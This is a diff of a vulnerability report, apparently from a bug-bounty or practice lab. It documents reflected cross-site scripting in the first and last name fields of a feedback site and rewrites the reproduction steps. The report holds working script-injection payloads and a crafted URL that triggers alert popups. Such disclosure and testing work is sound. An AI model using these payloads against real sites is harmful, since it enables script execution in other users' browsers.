@@ -10,16 +10,17 @@ A Reflected Cross-Site Scripting (XSS) vulnerability exists within the fname and
 <!-- Provide clear, numbered steps so another person can reproduce the issue. Include required requests, parameters, and actions. -->
 1.Navigate to the target application at [https://feedback.pwnedbox.site/](https://feedback.pwnedbox.site/).   
 
-2.Enter the payload "><scRipt>alert("First")</scriPt> into the First Name field.   
+2.Enter the payload "><scRipt>alert("First")</scriPt> into the First Name field and "><scRipt>alert("LAst")</scriPt> into the Last Name field and click Submit.   
 
-3.Enter the payload "><scRipt>alert("LAst")</scriPt> into the Last Name field and click Submit.   
+3.Alternatively, open the crafted URL directly: [https://feedback.pwnedbox.site/?fname=](https://feedback.pwnedbox.site/?fname=)"><sCRipt>alert%28"First"%29%3C%2FSCRipt%3E&lname="><sCRipt>alert%28"LAst"%29%3C%2FSCRipt%3E.   
 
-4.Alternatively, open the crafted URL directly: [https://feedback.pwnedbox.site/?fname=](https://feedback.pwnedbox.site/?fname=)"><sCRipt>alert%28"First"%29%3C%2FSCRipt%3E&lname="><sCRipt>alert%28"LAst"%29%3C%2FSCRipt%3E.   
-
-5.Observe the execution of the JavaScript alert popups (First and LAst). 
 ## POC (Proof of Concept)
 <!-- Add screenshots, HTTP requests/responses, payloads, or videos that demonstrate the vulnerability. -->
-1.Payloads Used:First Name: "><scRipt>alert("First")</scriPt>   Last Name: "><scRipt>alert("LAst")</scriPt> 
+1.Payloads Used:
+
+    "><scRipt>alert("First")</scriPt>
+    
+    "><scRipt>alert("LAst")</scriPt> 
 
 <img width="1920" height="970" alt="1" src="https://github.com/user-attachments/assets/47fea875-bb69-4bc0-ac98-e1831d7b1dd9" />
 
